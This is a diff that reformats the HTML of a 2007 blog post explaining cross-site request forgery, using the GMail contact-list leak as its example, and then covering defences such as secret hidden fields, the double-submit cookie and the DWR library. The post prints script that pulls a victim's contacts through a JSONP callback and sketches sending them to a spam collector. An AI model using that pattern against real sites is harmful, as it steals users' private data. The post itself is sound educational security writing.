@@ -1,10 +1,20 @@
-<!DOCTYPE html>
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="utf-8">
 
-<html lang="en">
-<head>
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="Joe Walker">
+
+  <link href="http://incompleteness.me/blog/atom.xml" rel="alternate" title="Incompleteness" type="application/atom+xml">
+  <link href="http://incompleteness.me/favicon.png" rel="shortcut icon">
+  <link href="http://incompleteness.me/styles/normalize.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="http://incompleteness.me/styles/blog.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="http://incompleteness.me/styles/twitter.css" media="screen, projection" rel="stylesheet" type="text/css">
+
+  <link rel="canonical" href="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">
+
   <title>CSRF Attacks or How to avoid exposing your GMail contacts - Incompleteness</title>
-  <link rel="canonical" href="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/" />
-  <meta name="author" content="Joe Walker" /><link href="http://incompleteness.me/blog/atom.xml" rel="alternate" title="Incompleteness" type="application/atom+xml" /><link href="http://incompleteness.me/favicon.png" rel="shortcut icon" /><link href="http://incompleteness.me/styles/normalize.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/blog.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/twitter.css" media="screen, projection" rel="stylesheet" type="text/css" /><meta charset="utf-8" /><meta name="HandheldFriendly" content="True" /><meta name="MobileOptimized" content="320" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 </head>
 
 <body>
@@ -14,8 +24,8 @@
   </ul>
   <form action="http://google.com/search" method="get">
     <fieldset role="site-search">
-      <input type="hidden" name="q" value="site:incompleteness.me" />
-      <input class="search" type="text" name="q" results="0" placeholder="Search" />
+      <input type="hidden" name="q" value="site:incompleteness.me">
+      <input class="search" type="text" name="q" results="0" placeholder="Search">
     </fieldset>
   </form>
   <ul role="main-navigation">
@@ -25,8 +35,10 @@
 
   <div id="main">
     <article>
-      <h1><a href="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">CSRF Attacks or How to avoid exposing your GMail contacts</a></h1><section class="content"><p>GMail is having a hard time at the moment, the latest problem is <a href="http://digg.com/programming/GMail_Hacked_Visit_ANY_Website_and_Your_Whole_Contact_List_Can_be_Stolen">a CSRF flaw</a> that allows anyone to read your GMail contacts.</p><p>CSRF is commonly mistaken for Cross-Site Scripting (XSS); <a href="http://cyber-knowledge.net/blog/2007/01/01/gmail-vulnerable-to-contact-list-hijacking/">the article linked to by Digg</a> makes this mistake, but the 2 attacks are not the same.</p><p>CSRF is a relatively unknown type of attack on a website, because it can be tricky to pull off. But this obscurity means that far more sites are vulnerable. In addition CSRF has all the potential of XSS so it is a powerful foe.</p><p>Aside: Sometimes you'll see references to this as XSRF, (I guess in deference to XSS). I'm using CSRF for 2 reasons. First, is that Wikipedia re-directs <a href="http://en.wikipedia.org/wiki/XSRF">XSRF</a> to <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">CSRF</a>, and second that's what Google says people are using. Compare the count on <a href="http://www.google.com/search?q=csrf+-civil+-construction+-cushing+-catholic+-canadian">this search for CSRF</a> (about 900k) with <a href="http://www.google.com/search?q=xsrf">this search on XSRF</a> (under 30k).</p><h2>How it works</h2><p>Normally an attacker is prevented from forging Cookies using Javascript by the domain rules in a browser. CSRF allows you to evade these rules. This is an example; it could be an HTML email or a web page.</p><pre>
-&lt;html&gt;
+
+      <h1><a href="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">CSRF Attacks or How to avoid exposing your GMail contacts</a></h1>
+
+      <section class="content"><p>GMail is having a hard time at the moment, the latest problem is <a href="http://digg.com/programming/GMail_Hacked_Visit_ANY_Website_and_Your_Whole_Contact_List_Can_be_Stolen">a CSRF flaw</a> that allows anyone to read your GMail contacts.</p><p>CSRF is commonly mistaken for Cross-Site Scripting (XSS); <a href="http://cyber-knowledge.net/blog/2007/01/01/gmail-vulnerable-to-contact-list-hijacking/">the article linked to by Digg</a> makes this mistake, but the 2 attacks are not the same.</p><p>CSRF is a relatively unknown type of attack on a website, because it can be tricky to pull off. But this obscurity means that far more sites are vulnerable. In addition CSRF has all the potential of XSS so it is a powerful foe.</p><p>Aside: Sometimes you'll see references to this as XSRF, (I guess in deference to XSS). I'm using CSRF for 2 reasons. First, is that Wikipedia re-directs <a href="http://en.wikipedia.org/wiki/XSRF">XSRF</a> to <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">CSRF</a>, and second that's what Google says people are using. Compare the count on <a href="http://www.google.com/search?q=csrf+-civil+-construction+-cushing+-catholic+-canadian">this search for CSRF</a> (about 900k) with <a href="http://www.google.com/search?q=xsrf">this search on XSRF</a> (under 30k).</p><h2>How it works</h2><p>Normally an attacker is prevented from forging Cookies using Javascript by the domain rules in a browser. CSRF allows you to evade these rules. This is an example; it could be an HTML email or a web page.</p><pre>&lt;html&gt;
 I've noticed that your bank has done some cool updates,
 why don't you login and checkout the funky new features.
 
@@ -40,8 +52,7 @@ setTimeout(30000, "window.open(url)");
   <li>Include some logic to try every few seconds waiting for Alice to login</li>
   <li>Script a sequence of requests to mimic the user following a wizard</li>
   <li>Send the page in an HTML email to target known bank users: Phishing without needing to setup a fake site.</li>
-</ul><p>According to the Cookie spec, using XHR, IFrame and Script Tags should not work. Cookies should only be sent to the owning-domain, and then only when the parent window is in the same domain. However it's more likely that the cookie spec will be re-written than that browsers will change because a fully conforming browser would break the many systems that make use of this; like most JavaScript widgets and many advertising systems.</p><h2>Anatomy of the GMail Attack</h2><p>It's fixed now, but before the fix, if you are logged onto GMail then <a href="http://googlified.com.googlepages.com/contactlist.htm">visiting this page</a> will show you all your GMail contacts. How does it work?</p><p>The attack uses script tags, and just assumes that you are logged-on. Since most GMail users are permanently logged on, this isn't a huge problem.</p><p>There is a Google URL that returns some script containing your contacts:</p><pre><a href="http://docs.google.com/data/contacts?out=js&amp;show=ALL&amp;psort=Affinity&amp;callback=google&amp;max=99999">http://docs.google.com/data/contacts?out=js&amp;show=ALL&amp;psort=Affinity&amp;callback=google&amp;max=99999</a></pre><p>The page used to look something like this:</p><pre>
-google ({
+</ul><p>According to the Cookie spec, using XHR, IFrame and Script Tags should not work. Cookies should only be sent to the owning-domain, and then only when the parent window is in the same domain. However it's more likely that the cookie spec will be re-written than that browsers will change because a fully conforming browser would break the many systems that make use of this; like most JavaScript widgets and many advertising systems.</p><h2>Anatomy of the GMail Attack</h2><p>It's fixed now, but before the fix, if you are logged onto GMail then <a href="http://googlified.com.googlepages.com/contactlist.htm">visiting this page</a> will show you all your GMail contacts. How does it work?</p><p>The attack uses script tags, and just assumes that you are logged-on. Since most GMail users are permanently logged on, this isn't a huge problem.</p><p>There is a Google URL that returns some script containing your contacts:</p><pre><a href="http://docs.google.com/data/contacts?out=js&amp;show=ALL&amp;psort=Affinity&amp;callback=google&amp;max=99999">http://docs.google.com/data/contacts?out=js&amp;show=ALL&amp;psort=Affinity&amp;callback=google&amp;max=99999</a></pre><p>The page used to look something like this:</p><pre>google ({
   Success: true,
   Errors: [],
   Body: {
@@ -67,8 +78,7 @@ google ({
     ]
   }
 })
-</pre><p>So we're calling a function "<code>google()</code>" and passing it a data structure that includes all your contacts. So all we need to do is to do something with this data. The page I linked-to earlier creates a list from it using code like this:</p><pre>
-&lt;script type="text/javascript"&gt;
+</pre><p>So we're calling a function "<code>google()</code>" and passing it a data structure that includes all your contacts. So all we need to do is to do something with this data. The page I linked-to earlier creates a list from it using code like this:</p><pre>&lt;script type="text/javascript"&gt;
 function google(data){
     var emails, i;
     for (i = 0; i &lt; data.Body.Contacts.length; i++) {
@@ -80,8 +90,7 @@ function google(data){
 
 &lt;script type="text/javascript" src="http://docs.google.com/data/contacts?out=js&amp;show=ALL&amp;psort=Affinity&amp;callback=google&amp;max=99999"&gt;
 &lt;/script&gt;
-</pre><p>But it would be just as easy to post the list of addresses off to some spam address catcher service:</p><pre>
-&lt;script type="text/javascript"&gt;
+</pre><p>But it would be just as easy to post the list of addresses off to some spam address catcher service:</p><pre>&lt;script type="text/javascript"&gt;
 function google(data){
     var body, i;
     for (i = 0; i &lt; data.Body.Contacts.length; i++) {
@@ -96,19 +105,24 @@ function google(data){
   <li>Switching to POST and denying GET: Forms can be trivially altered with DOM manipulation to forge POST requests.</li>
   <li>Checking the referrer field: the referrer field is open to manipulation and it is sometimes not sent by browsers. So you are left with a choice between allowing no referrer (an attacker can get around this) and denying no referrer (breaks many innocent users).</li>
   <li>JSON: Removing the function call in the GMail example would protect read-only resources since browsers will act on cross-domain rules to keep the reply from you. If the server request changes any server side state then even though the browser can't read the reply, it can still cause the state to change.</li>
-</ul><h3>Secret Hidden Fields</h3><p>If all your sensitive URLs contain some secret shipped with the page, then the cross-domain rules in the browser will stop an attacker from discovering the secret, so the server can distinguish between submissions that come from pages supplied by the server (which are safe).</p><p>This technique is good for the "Web 1.0" situations which are light on scripting. It is fairly complex to setup because it requires the server to keep a track of the secret, and to manipulate all forms to contain a hidden field.</p><h3>Double Submit the Cookie</h3><p>The CSRF attack works by subverting what the browser will do with the cookie.&nbsp; Ideally, your cookies would be totally unavailable to anyone outside of your domain. This attack works because XMLHttpRequest in some page can use the cookies of some foreign domain when posting to that foreign domain. However the script can not read the cookie directly due to the cross-domain rules, so a slight modification of the hidden field solution is to read the session cookie using JavaScript and then adding to URLs, forms or the body of a POST request, and then checking in the server that the session cookie value that the browser sends in the header (which is subvertable) is the same as the session cookie in the request (this is not subvertable in the same way).</p><p>If you are using Ajax or a significant amount of scripting then this solution is a simple fix once solution.</p><h2>Use a Library</h2><a href="http://directwebremoting.org/dwr/"><img src="http://incompleteness.me/images/posts/dwr-logo.png" align="right" style="margin: 0px 10px;" border="0" /></a><p>Specifically - use DWR. If you are using DWR version 2 then this CSRF protection comes for free. DWR implements the double cookie submission pattern transparently.</p></section><section class="meta">
-  <span class="byline author vcard">
-    Posted by <span class="fn">Joe Walker</span>
-  </span>
-  <time datetime="2007-01-1T19:12:40+00:00" pubdate="pubdate">
-    <span class="day">1</span>
-    <span class="month">Jan</span>
-    <span class="year">2007</span>
-  </time>
-</section><section class="sharing">
-  <a href="http://twitter.com/share" class="twitter-share-button" data-via="joewalker" data-url="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/" data-counturl="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">Tweet</a>
-  <div class="g-plusone" data-size="medium"></div>
-</section>
+</ul><h3>Secret Hidden Fields</h3><p>If all your sensitive URLs contain some secret shipped with the page, then the cross-domain rules in the browser will stop an attacker from discovering the secret, so the server can distinguish between submissions that come from pages supplied by the server (which are safe).</p><p>This technique is good for the "Web 1.0" situations which are light on scripting. It is fairly complex to setup because it requires the server to keep a track of the secret, and to manipulate all forms to contain a hidden field.</p><h3>Double Submit the Cookie</h3><p>The CSRF attack works by subverting what the browser will do with the cookie.&nbsp; Ideally, your cookies would be totally unavailable to anyone outside of your domain. This attack works because XMLHttpRequest in some page can use the cookies of some foreign domain when posting to that foreign domain. However the script can not read the cookie directly due to the cross-domain rules, so a slight modification of the hidden field solution is to read the session cookie using JavaScript and then adding to URLs, forms or the body of a POST request, and then checking in the server that the session cookie value that the browser sends in the header (which is subvertable) is the same as the session cookie in the request (this is not subvertable in the same way).</p><p>If you are using Ajax or a significant amount of scripting then this solution is a simple fix once solution.</p><h2>Use a Library</h2><a href="http://directwebremoting.org/dwr/"><img src="../images/posts/dwr-logo.png" align="right" style="margin:0px 10px" border="0"></a><p>Specifically - use DWR. If you are using DWR version 2 then this CSRF protection comes for free. DWR implements the double cookie submission pattern transparently.</p></section>
+
+      <section class="meta">
+        <span class="byline author vcard">
+          Posted by <span class="fn">Joe Walker</span>
+        </span>
+        <time datetime="2007-01-1T19:12:40+00:00" pubdate="">
+          <span class="day">1</span>
+          <span class="month">Jan</span>
+          <span class="year">2007</span>
+        </time>
+      </section>
+
+      <section class="sharing">
+        <a href="http://twitter.com/share" class="twitter-share-button" data-via="joewalker" data-url="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/" data-counturl="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">Tweet</a>
+        <div class="g-plusone" data-size="medium"></div>
+      </section>
+
       <section class="comments">
         <h2>Comments</h2>
         
@@ -128,15 +142,15 @@ function google(data){
   <h2>Incompleteness</h2>
 
   <p>
-    <a href="http://incompleteness.me/blog/" style="float: right;">
-      <img src="http://incompleteness.me/images/rss_icon.png" />
+    <a href="http://incompleteness.me/blog/" style="float:right">
+      <img src="http://incompleteness.me/images/rss_icon.png">
     </a>
     The <a href="http://incompleteness.me/blog/">blog</a> is about general web development.
     (<a href="http://incompleteness.me/blog/atom.xml">Atom feed</a>)
   </p>
   <p>
-    <a href="http://incompleteness.me/mozblog/" style="float: right;">
-      <img src="http://incompleteness.me/images/firefox_40.png" />
+    <a href="http://incompleteness.me/mozblog/" style="float:right">
+      <img src="http://incompleteness.me/images/firefox_40.png">
     </a>
     <a href="http://incompleteness.me/mozblog/">MozBlog</a> contains Mozilla stuff - i.e
     stuff for <a href="http://planet.mozilla.org/">planet</a>
@@ -147,8 +161,8 @@ function google(data){
     See also the <a href="http://incompleteness.me/blog/archives/">Archives</a>
   </p>
   <p>
-    If it's a choice between<br />
-    incomplete or wrong,<br />
+    If it's a choice between<br>
+    incomplete or wrong,<br>
     side with <a href="http://en.wikipedia.org/wiki/G%C3%B6del%27s_incompleteness_theorems">Gödel</a>.
   </p>
 
@@ -191,6 +205,8 @@ function google(data){
   <h2>Recent Posts</h2>
   <ul id="recent_posts">
     <li class="post">
+      <a href="http://incompleteness.me/blog/2015/02/09/console-dot-mihai/">console.mihai();</a>
+    </li><li class="post">
       <a href="http://incompleteness.me/blog/2014/04/24/combatting-self-xss-part-2/">Combatting Self-XSS (Part 2)</a>
     </li><li class="post">
       <a href="http://incompleteness.me/blog/2013/03/07/work-for-mozilla-building-developer-tools/">Work for Mozilla building Developer Tools</a>
@@ -208,8 +224,6 @@ function google(data){
       <a href="http://incompleteness.me/blog/2010/09/13/marketing-according-to-the-browser-makers/">Marketing (according to the browser makers)</a>
     </li><li class="post">
       <a href="http://incompleteness.me/blog/2010/02/01/apple-and-adobe-obituaries-and-idealism/">Apple and Adobe, Obituaries and Idealism</a>
-    </li><li class="post">
-      <a href="http://incompleteness.me/blog/2009/08/13/collaboration-in-bespin/">Collaboration in Bespin</a>
     </li>
   </ul>
 </section>
@@ -237,7 +251,7 @@ function google(data){
     Copyright © 2011 - Joe Walker -
     <span class="credit">Powered by <a href="https://github.com/joewalker/jspress/">JSPress</a></span>
   </p>
-</footer><script type="text/javascript">
+</footer><script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script><script type="text/javascript">
   (function() {
     var script = document.createElement('script');
     script.type = 'text/javascript';
@@ -255,5 +269,6 @@ function google(data){
     document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
   })();
 </script>
-</body>
-</html>
+
+
+</body></html>
